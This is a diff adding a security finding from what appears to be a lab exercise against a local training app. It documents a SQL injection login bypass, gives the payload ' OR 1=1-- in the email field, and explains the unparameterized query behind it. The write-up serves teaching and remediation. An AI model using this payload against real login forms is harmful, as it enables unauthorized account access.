@@ -1,0 +1,23 @@
+Finding 1: SQL Injection - Authentication Bypass
+===================================================
+
+Endpoint: POST http://localhost:3000/rest/user/login
+
+Request body (as submitted via the login form):
+{
+  "email": "' OR 1=1--",
+  "password": "x"
+}
+
+Result:
+- Login succeeded without valid credentials.
+- Application's internal challenge tracker logged:
+  "info: Solved 2-star loginAdminChallenge (Login Admin)"
+  (see evidence/03-idor-and-sqli-solved-log.png for this confirmation)
+
+Root cause:
+The backend concatenates the email field directly into a SQL WHERE clause
+instead of using parameterized queries. The payload ' OR 1=1-- closes the
+string early and appends a condition that is always true, then comments
+out the rest of the query (including the password check), returning the
+first matching user record (admin) and authenticating as that user.
